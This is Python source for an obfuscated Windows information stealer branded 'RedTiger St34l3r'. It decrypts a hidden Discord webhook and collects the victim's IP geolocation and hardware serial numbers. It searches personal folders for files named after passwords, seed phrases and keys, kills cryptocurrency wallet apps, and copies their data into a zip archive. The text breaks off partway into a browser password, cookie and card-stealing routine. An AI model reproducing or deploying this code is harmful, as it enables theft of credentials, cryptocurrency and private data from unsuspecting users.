
import sys

def D3f_V3rific4ti0n():
    def D3f_On1yW1nd0w5():
        if sys.platform.startswith("win"):
            return False
        else:
            return True
    
    try: 
        v4r_status = D3f_On1yW1nd0w5()
        if v4r_status == True:
            return v4r_status
    except:
        return True
    
if D3f_V3rific4ti0n() == True:
    sys.exit()
    
import os
import socket
import win32api
import requests
import base64
import ctypes
import threading
import discord
import zipfile
import io
from json import loads
from urllib.request import urlopen
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend

def D3f_Sy5t3mInf0(v4r_zip_file): 
    v4r_status_system_info = None
    return v4r_status_system_info

def D3f_R0b10xAccount(v4r_zip_file):
    v4r_number_roblox_account = None
    return v4r_number_roblox_account

def D3f_Di5c0rdAccount(v4r_zip_file):
    v4r_number_discord_account = None
    return v4r_number_discord_account

def D3f_Di5c0rdInj3c710n(): 
    v4r_number_discord_injection = None
    return v4r_number_discord_injection

def D3f_Br0w53r5t341(v4r_zip_file): 
    v4r_number_extentions = None
    v4r_number_passwords = None
    v4r_number_cookies = None
    v4r_number_history = None
    v4r_number_downloads = None
    v4r_number_cards = None
    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

def D3f_S3ssi0nFil3s(v4r_zip_file):
    v4r_name_wallets = None
    v4r_name_game_launchers = None
    v4r_name_apps = None
    return v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps

def D3f_Int3r3stingFil3s(v4r_zip_file):
    v4r_number_files = None
    return v4r_number_files

def D3f_W3bc4m(v4r_zip_file):
    v4r_status_camera_capture = None
    return v4r_status_camera_capture

def D3f_Scr33n5h0t(v4r_zip_file): 
    v4r_number_screenshot = None
    return v4r_number_screenshot

def D3f_St4rtup(): pass
def D3f_R3st4rt(): pass
def D3f_B10ckK3y(): pass
def D3f_Unb10ckK3y(): pass
def D3f_B10ckT45kM4n4g3r(): pass
def D3f_B10ckM0u53(): pass
def D3f_B10ckW3b5it3(): pass
def D3f_F4k33rr0r(): pass
def D3f_Sp4m0p3nPr0gr4m(): pass
def D3f_Sp4mCr34tFil3(): pass
def D3f_Shutd0wn(): pass
def D3f_Sp4m_Opti0ns(): pass

def D3f_Title(title):
    try:
        if sys.platform.startswith("win"):
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        elif sys.platform.startswith("linux"):
            sys.stdout.write(f"\x1b]2;{title}\x07")
    except:
        pass
        
def D3f_Clear():
    try:
        if sys.platform.startswith("win"):
            os.system("cls")
        elif sys.platform.startswith("linux"):
            os.system("clear")
    except:
        pass

def D3f_Decrypt(v4r_encrypted, v4r_key):
    def D3f_DeriveKey(v4r_password, v4r_salt):
        v4r_kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=v4r_salt, iterations=100000, backend=default_backend())
        if isinstance(v4r_password, str):  
            v4r_password = v4r_password.encode()  
        return v4r_kdf.derive(v4r_password)

    v4r_encrypted_data = base64.b64decode(v4r_encrypted)
    v4r_salt = v4r_encrypted_data[:16]
    v4r_iv = v4r_encrypted_data[16:32]
    v4r_encrypted_data = v4r_encrypted_data[32:]
    v4r_derived_key = D3f_DeriveKey(v4r_key, v4r_salt)
    v4r_cipher = Cipher(algorithms.AES(v4r_derived_key), modes.CBC(v4r_iv), backend=default_backend())
    v4r_decryptor = v4r_cipher.decryptor()
    v4r_decrypted_data = v4r_decryptor.update(v4r_encrypted_data) + v4r_decryptor.finalize()
    v4r_unpadder = padding.PKCS7(128).unpadder()
    v4r_original_data = v4r_unpadder.update(v4r_decrypted_data) + v4r_unpadder.finalize()
    return v4r_original_data.decode()

D3f_Title("")

try: v4r_hostname_pc    = socket.gethostname()
except: v4r_hostname_pc = "None"

try: v4r_username_pc    = os.getlogin()
except: v4r_username_pc = "None"

try: v4r_displayname_pc    = win32api.GetUserNameEx(win32api.NameDisplay)
except: v4r_displayname_pc = "None"

try: v4r_ip_address_public    = requests.get("https://api.ipify.org?format=json").json().get("ip", "None")
except: v4r_ip_address_public = "None"

try: v4r_ip_adress_local    = socket.gethostbyname(socket.gethostname())
except: v4r_ip_adress_local = "None"

v4r_w3bh00k_ur1_crypt = r"""
KcBjeAEWg/d+Zt2dQq+gwepkNlr2j+6+c7N1GgvmZ7gACxrD1kVUk8fEwISqF4B6B4q7euCVbRcmycTfbFPKX4slaYB4SGh32VVr8TajGdNy5+cRT433AOtxaxHpp0Q/mTR1/FuOLKBv1L33sW9sNERjiTCBwX5sSDCkkmVoBdpBPFmxLha2lY4weANTgLe3EAxin5+HbSJjljyo79M2Uw==
"""

v4r_k3y            = "WBiYWmdOxsehiFaioiNXiRCbMukroypkezPBacZXKXTWPXsNWbTSReGkxrnQiQxxjssRDhKBJsvGIpsaWiVExHTIpqfPasgJecfNQZeoJqCUDhzNkEYlfqiNBrTnUwxCmaflmAmGaCCsPiRWquhImAwJhdrfUXHGZlnjQyUAsUxb"
v4r_website        = "None"
v4r_color_embed    = 0xa80505
v4r_username_embed = "RedTiger St34l3r"
v4r_avatar_embed   = "https://google.com"
v4r_footer_text    = "RedTiger St34l3r - github.com/loxy0dev/RedTiger-Tools"
v4r_footer_embed   = {"text": v4r_footer_text, "icon_url": v4r_avatar_embed}
v4r_title_embed    = f'`{v4r_username_pc} "{v4r_ip_address_public}"`'
v4r_w3bh00k_ur1    = D3f_Decrypt(v4r_w3bh00k_ur1_crypt, v4r_k3y)

v4r_path_windows           = os.getenv("WINDIR", None)
v4r_path_userprofile       = os.getenv('USERPROFILE', None)
v4r_path_appdata_local     = os.getenv('LOCALAPPDATA', None)
v4r_path_appdata_roaming   = os.getenv('APPDATA', None)
v4r_path_program_files_x86 = os.getenv('ProgramFiles(x86)', None)
if v4r_path_program_files_x86 is None:
    v4r_path_program_files_x86 = os.getenv('ProgramFiles', None)

try:
    v4r_response = requests.get(f"https://{v4r_website}/api/ip/ip={v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('country_code', "None")
    v4r_region = v4r_api.get('region', "None")
    v4r_region_code = v4r_api.get('region_code', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('latitude', "None")
    v4r_longitude = v4r_api.get('longitude', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")
except:
    v4r_response = requests.get(f"http://ip-api.com/json/{v4r_ip_address_public}")
    v4r_api = v4r_response.json()

    v4r_country = v4r_api.get('country', "None")
    v4r_country_code = v4r_api.get('countryCode', "None")
    v4r_region = v4r_api.get('regionName', "None")
    v4r_region_code = v4r_api.get('region', "None")
    v4r_zip_postal = v4r_api.get('zip', "None")
    v4r_city = v4r_api.get('city', "None")
    v4r_latitude = v4r_api.get('lat', "None")
    v4r_longitude = v4r_api.get('lon', "None")
    v4r_timezone = v4r_api.get('timezone', "None")
    v4r_isp = v4r_api.get('isp', "None")
    v4r_org = v4r_api.get('org', "None")
    v4r_as_number = v4r_api.get('as', "None")

def D3f_Sy5t3mInf0(v4r_zip_file):
    import platform
    import subprocess
    import uuid
    import psutil
    import GPUtil
    import ctypes
    import win32api
    import string
    import screeninfo
    import winreg

    try: v4r_sy5t3m_1nf0 = platform.system()
    except: v4r_sy5t3m_1nf0 = "None"

    try: v4r_sy5t3m_v3r5i0n_1nf0 = platform.version()
    except: v4r_sy5t3m_v3r5i0n_1nf0 = "None"

    try: v4r_m4c_4ddr355 = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0,2*6,2)][::-1])
    except: v4r_m4c_4ddr355 = "None"

    try: v4r_r4m_1nf0 = str(round(psutil.virtual_memory().total / (1024**3), 2)) + "Go"
    except: v4r_r4m_1nf0 = "None"

    try: v4r_cpu_1nf0 = platform.processor()
    except: v4r_cpu_1nf0 = "None"

    try: v4r_cpu_c0r3_1nf0 = str(psutil.cpu_count(logical=False)) + " Core"
    except: v4r_cpu_c0r3_1nf0 = "None"

    try: v4r_gpu_1nf0 = GPUtil.getGPUs()[0].name if GPUtil.getGPUs() else "None"
    except: v4r_gpu_1nf0 = "None"

    v4r_path_Cryptography                 = r"SOFTWARE\Microsoft\Cryptography"
    v4r_path_SQMClient                    = r"SOFTWARE\Microsoft\SQMClient"
    v4r_path_HardwareProfiles             = r"SYSTEM\CurrentControlSet\Control\IDConfigDB\Hardware Profiles\0001"
    v4r_path_Nvidia                       = r'SOFTWARE\NVIDIA Corporation'
    v4r_path_HardwareConfig               = r'SYSTEM\HardwareConfig\Current'

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_Cryptography, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineGuid")
            v4r_Machine_Guid = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Machine_Guid = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareProfiles, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "GUID")
            v4r_Guid_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Guid_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareProfiles, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "HwProfileGuid")
            v4r_Hw_Profile_Guid = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Hw_Profile_Guid = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_SQMClient, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "MachineId")
            v4r_Machine_Id = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Machine_Id = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_Nvidia+r'\Installer2', 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemID")
            v4r_Nvidia_System_Id = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Nvidia_System_Id = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardProduct")
            v4r_Motherboard_Product_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Motherboard_Product_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BaseBoardManufacturer")
            v4r_Motherboard_Manufacturer_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Motherboard_Manufacturer_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSReleaseDate")
            v4r_Bios_Release_Date = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Bios_Release_Date = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "BIOSVersion")
            v4r_Bios_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_Bios_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemBiosVersion")
            v4r_System_Bios_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Bios_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemVersion")
            v4r_System_Version = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Version = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemFamily")
            v4r_System_Family_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Family_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemManufacturer")
            v4r_System_Manufacturer_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Manufacturer_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemProductName")
            v4r_System_Product_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_Product_Serial_Number = None

    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, v4r_path_HardwareConfig, 0, winreg.KEY_READ) as key:
            v4r_value, v4r_reg_type = winreg.QueryValueEx(key, "SystemSKU")
            v4r_System_SKU_Serial_Number = str(v4r_value).replace("{", "").replace("}", "")
    except: v4r_System_SKU_Serial_Number = None

    def RunPowershell(query):
        try:
            result = subprocess.check_output(
                ['powershell', '-Command', query],
                stderr=subprocess.STDOUT,
                text=True
            ).split('\n')[0].strip()
            return result if result else None
        except:
            return None

    try: v4r_Uuid_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_ComputerSystemProduct).UUID")
    except: v4r_Uuid_Serial_Number = None

    try: v4r_Bios_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BIOS).SerialNumber")
    except: v4r_Bios_Serial_Number = None

    try: v4r_Motherboard_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BaseBoard).SerialNumber")
    except: v4r_Motherboard_Serial_Number = None

    try: v4r_Processor_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: v4r_Processor_Serial_Number = None

    try: v4r_OemString_Serial_Number = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: v4r_OemString_Serial_Number = None

    try: v4r_Asset_Tag = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: v4r_Asset_Tag = None
        
    try:
        v4r_drives_info = []
        v4r_bitmask = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if v4r_bitmask & 1:
                v4r_drive_path = v4r_letter + ":\\"
                try:
                    v4r_free_bytes = ctypes.c_ulonglong(0)
                    v4r_total_bytes = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(v4r_drive_path), None, ctypes.pointer(v4r_total_bytes), ctypes.pointer(v4r_free_bytes))
                    v4r_total_space = v4r_total_bytes.value
                    v4r_free_space = v4r_free_bytes.value
                    v4r_used_space = v4r_total_space - v4r_free_space
                    v4r_drive_name = win32api.GetVolumeInformation(v4r_drive_path)[0]
                    drive = {
                        'drive': v4r_drive_path,
                        'total': v4r_total_space,
                        'free': v4r_free_space,
                        'used': v4r_used_space,
                        'name': v4r_drive_name,
                    }
                    v4r_drives_info.append(drive)
                except:
                    ()
            v4r_bitmask >>= 1

        v4r_d15k_5t4t5 = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in v4r_drives_info:
            v4r_use_percent = (v4r_drive['used'] / v4r_drive['total']) * 100
            v4r_free_space_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            v4r_total_space_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            v4r_use_percent_str = "{:.2f}%".format(v4r_use_percent)
            v4r_d15k_5t4t5 += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   v4r_free_space_gb,
                                                                   v4r_total_space_gb,
                                                                   v4r_use_percent_str,
                                                                   v4r_drive['name'])
    except:
        v4r_d15k_5t4t5 = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            v4r_p14tf0rm_1nf0 = 'Pc Portable'
        else:
            v4r_p14tf0rm_1nf0 = 'Pc Fixed'
    except:
        v4r_p14tf0rm_1nf0 = "None"

    try: v4r_scr33n_number = len(screeninfo.get_monitors())
    except: v4r_scr33n_number = "None"

    v4r_status_system_info = "Yes"
    v4r_file_system_info = f"""
User Pc:
 - Hostname    : {v4r_hostname_pc}
 - Username    : {v4r_username_pc}
 - DisplayName : {v4r_displayname_pc}

System:
 - Plateform     : {v4r_p14tf0rm_1nf0}
 - Exploitation  : {v4r_sy5t3m_1nf0} {v4r_sy5t3m_v3r5i0n_1nf0}
 - Screen Number : {v4r_scr33n_number}

Peripheral:
 - CPU : {v4r_cpu_1nf0}, {v4r_cpu_c0r3_1nf0} 
 - GPU : {v4r_gpu_1nf0}
 - RAM : {v4r_r4m_1nf0}

Disk:
{v4r_d15k_5t4t5}

Serial Number:
 - MAC                       : {v4r_m4c_4ddr355}
 - Machine Id                : {v4r_Machine_Id}
 - Machine Guid              : {v4r_Machine_Guid}
 - Hw Profile Guid           : {v4r_Hw_Profile_Guid}
 - Nvidia System Id          : {v4r_Nvidia_System_Id}
 - Guid Serial Number        : {v4r_Guid_Serial_Number}
 - Uuid Serial Number        : {v4r_Uuid_Serial_Number}
 - Motherboard Serial Number : {v4r_Motherboard_Serial_Number}
 - Motherboard Product       : {v4r_Motherboard_Product_Serial_Number}
 - Motherboard Manufacturer  : {v4r_Motherboard_Manufacturer_Serial_Number}
 - Processor Serial Number   : {v4r_Processor_Serial_Number}
 - Bios Serial Number        : {v4r_Bios_Serial_Number}
 - Bios Release Date         : {v4r_Bios_Release_Date}
 - Bios Version              : {v4r_Bios_Version}
 - System Bios Version       : {v4r_System_Bios_Version}
 - System Version            : {v4r_System_Version}
 - System Family             : {v4r_System_Family_Serial_Number}
 - System Manufacturer       : {v4r_System_Manufacturer_Serial_Number}
 - System Product            : {v4r_System_Product_Serial_Number}
 - System SKU                : {v4r_System_SKU_Serial_Number}
 - Oem String Serial Number  : {v4r_OemString_Serial_Number}
 - Asset Tag Serial Number   : {v4r_Asset_Tag}

Ip:
 - Public : {v4r_ip_address_public}
 - Local  : {v4r_ip_adress_local}

Ip Information:
 - Isp : {v4r_isp}
 - Org : {v4r_org}
 - As  : {v4r_as_number}

Ip Location:
 - Country   : {v4r_country} ({v4r_country_code})
 - Region    : {v4r_region} ({v4r_region_code})
 - Zip       : {v4r_zip_postal}
 - City      : {v4r_city}
 - Timezone  : {v4r_timezone}
 - Longitude : {v4r_longitude}
 - Latitude  : {v4r_latitude}
"""
    v4r_zip_file.writestr("System Info.txt", v4r_file_system_info)

    return v4r_status_system_info

def D3f_Int3r3stingFil3s(v4r_zip_file):
    import os
    import random

    v4r_paths = [
        os.path.join(v4r_path_userprofile, "Desktop"),
        os.path.join(v4r_path_userprofile, "Downloads"),
        os.path.join(v4r_path_userprofile, "Documents"),
        os.path.join(v4r_path_userprofile, "Picture"),
        os.path.join(v4r_path_userprofile, "Video"),
        os.path.join(v4r_path_userprofile, "OneDrive"),
        os.path.join(v4r_path_appdata_roaming, "Microsoft", "Windows", "Recent")
    ]

    v4r_keywords = [
        "2fa", "mfa", "2step", "otp", "verification", "verif",
        "acount", "account", "compte", "identifiant", "login",
        "personnel", "personal", "perso",
        "banque", "bank", "funds", "fonds", "paypal", "casino",
        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège"
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup",
    ]

    v4r_name_files = []

    for v4r_path in v4r_paths:
        for v4r_root, v4r_dirs, v4r_files in os.walk(v4r_path):
            for v4r_file in v4r_files:
                try:
                    if v4r_file.lower().endswith(('.txt', '.sql', '.zip')):
                        v4r_file_name_no_ext = os.path.splitext(v4r_file)[0].lower()
                        for v4r_keyword in v4r_keywords:
                            try:
                                if v4r_keyword.lower() == v4r_file_name_no_ext:
                                    v4r_full_path = os.path.join(v4r_root, v4r_file)
                                    if os.path.exists(v4r_full_path):
                                        v4r_name_files.append(v4r_file)
                                        v4r_base_name, v4r_ext = os.path.splitext(v4r_file)
                                        with open(v4r_full_path, "rb") as v4r_f:
                                            v4r_zip_file.writestr(os.path.join("Interesting Files", v4r_base_name + f"_{random.randint(1, 9999)}" + v4r_ext), v4r_f.read())
                                    break
                            except: pass
                except: pass

    if v4r_name_files:
        v4r_number_files = sum(len(phrase.split()) for phrase in v4r_name_files)
    else:
        v4r_number_files = 0

    return v4r_number_files

def D3f_S3ssi0nFil3s(v4r_zip_file):
    import os
    import psutil

    v4r_session_files_choice = ["Wallets"]
    v4r_name_wallets         = [] if "Wallets" in v4r_session_files_choice else None
    v4r_name_game_launchers  = [] if "Game Launchers" in v4r_session_files_choice else None
    v4r_name_apps            = [] if "Apps" in v4r_session_files_choice else None

    v4r_session_files = [
        ("Zcash",             os.path.join(v4r_path_appdata_roaming,   "Zcash"),                                                      "zcash.exe",             "Wallets"),
        ("Armory",            os.path.join(v4r_path_appdata_roaming,   "Armory"),                                                     "armory.exe",            "Wallets"),
        ("Bytecoin",          os.path.join(v4r_path_appdata_roaming,   "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
        ("Guarda",            os.path.join(v4r_path_appdata_roaming,   "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
        ("Atomic Wallet",     os.path.join(v4r_path_appdata_roaming,   "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
        ("Exodus",            os.path.join(v4r_path_appdata_roaming,   "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
        ("Binance",           os.path.join(v4r_path_appdata_roaming,   "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
        ("Jaxx Liberty",      os.path.join(v4r_path_appdata_roaming,   "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
        ("Electrum",          os.path.join(v4r_path_appdata_roaming,   "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
        ("Coinomi",           os.path.join(v4r_path_appdata_roaming,   "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
        ("Trust Wallet",      os.path.join(v4r_path_appdata_roaming,   "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
        ("AtomicDEX",         os.path.join(v4r_path_appdata_roaming,   "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
        ("Wasabi Wallet",     os.path.join(v4r_path_appdata_roaming,   "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
        ("Ledger Live",       os.path.join(v4r_path_appdata_roaming,   "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
        ("Trezor Suite",      os.path.join(v4r_path_appdata_roaming,   "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
        ("Blockchain Wallet", os.path.join(v4r_path_appdata_roaming,   "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
        ("Mycelium",          os.path.join(v4r_path_appdata_roaming,   "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
        ("Crypto.com",        os.path.join(v4r_path_appdata_roaming,   "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
        ("BRD",               os.path.join(v4r_path_appdata_roaming,   "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
        ("Coinbase Wallet",   os.path.join(v4r_path_appdata_roaming,   "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
        ("Zerion",            os.path.join(v4r_path_appdata_roaming,   "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
        ("Steam",             os.path.join(v4r_path_program_files_x86, "Steam", "config"),                                            "steam.exe",             "Game Launchers"),
        ("Riot Games",        os.path.join(v4r_path_appdata_local,     "Riot Games", "Riot Client", "Data"),                          "riot.exe",              "Game Launchers"),
        ("Epic Games",        os.path.join(v4r_path_appdata_local,     "EpicGamesLauncher"),                                          "epicgameslauncher.exe", "Game Launchers"),
        ("Rockstar Games",    os.path.join(v4r_path_appdata_local,     "Rockstar Games"),                                             "rockstarlauncher.exe",  "Game Launchers"),
        ("Telegram",          os.path.join(v4r_path_appdata_roaming,   "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps")
    ]

    try:
        for v4r_name, v4r_path, v4r_proc_name, v4r_type in v4r_session_files:
            if v4r_type in v4r_session_files_choice:
                for v4r_proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if v4r_proc.info['name'].lower() == v4r_proc_name.lower():
                            v4r_proc.terminate()
                    except:
                        pass
    except:
        pass

    for v4r_name, v4r_path, v4r_proc_name, v4r_type in v4r_session_files:
        if v4r_type in v4r_session_files_choice and os.path.exists(v4r_path):
            try:
                if v4r_type == "Wallets" and v4r_name_wallets is not None:
                    v4r_name_wallets.append(v4r_name)
                elif v4r_type == "Game Launchers" and v4r_name_game_launchers is not None:
                    v4r_name_game_launchers.append(v4r_name)
                elif v4r_type == "Apps" and v4r_name_apps is not None:
                    v4r_name_apps.append(v4r_name)

                v4r_zip_file.writestr(os.path.join("Session Files", v4r_name, "path.txt"), v4r_path)

                if os.path.isdir(v4r_path):
                    for v4r_root, _, v4r_files in os.walk(v4r_path):
                        for v4r_file in v4r_files:
                            v4r_abs_file_path = os.path.join(v4r_root, v4r_file)
                            v4r_rel_path_in_zip = os.path.join(
                                "Session Files", v4r_name, "Files",
                                os.path.relpath(v4r_abs_file_path, v4r_path)
                            )
                            try:
                                v4r_zip_file.write(v4r_abs_file_path, v4r_rel_path_in_zip)
                            except:
                                pass
                else:
                    v4r_rel_path_in_zip = os.path.join("Session Files", v4r_name, "Files", os.path.basename(v4r_path))
                    try:
                        v4r_zip_file.write(v4r_path, v4r_rel_path_in_zip)
                    except:
                        pass
            except:
                pass

    if "Wallets" in v4r_session_files_choice:
        v4r_name_wallets = ", ".join(v4r_name_wallets) if v4r_name_wallets else "No"
    if "Game Launchers" in v4r_session_files_choice:
        v4r_name_game_launchers = ", ".join(v4r_name_game_launchers) if v4r_name_game_launchers else "No"
    if "Apps" in v4r_session_files_choice:
        v4r_name_apps = ", ".join(v4r_name_apps) if v4r_name_apps else "No"

    return v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps

def D3f_Br0w53r5t341(v4r_zip_file):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

    v4r_browser_choice = ["extentions", "passwords", "cookies", "history", "downloads", "cards"]
    v4r_browsers = []

    if "extentions" in v4r_browser_choice:
        v4r_number_extentions = 0
    else:
        v4r_number_extentions = None

    if "passwords" in v4r_browser_choice:
        v4r_file_passwords = []
        v4r_number_passwords = 0
    else:
        v4r_file_passwords = ""
        v4r_number_passwords = None
    if "cookies" in v4r_browser_choice:
        v4r_file_cookies = []
        v4r_number_cookies = 0
    else:
        v4r_file_cookies = ""
        v4r_number_cookies = None
    if "history" in v4r_browser_choice:
        v4r_file_history = []
        v4r_number_history = 0
    else:
        v4r_file_history = ""
        v4r_number_history = None
    if "downloads" in v4r_browser_choice:
        v4r_file_downloads = []
        v4r_number_downloads = 0
    else:
        v4r_file_downloads = ""
        v4r_number_downloads = None
    if "cards" in v4r_browser_choice:
        v4r_file_cards = []
        v4r_number_cards = 0
    else:
        v4r_file_cards = ""
        v4r_number_cards = None
    
    def D3f_GetMasterKey(v4r_path):
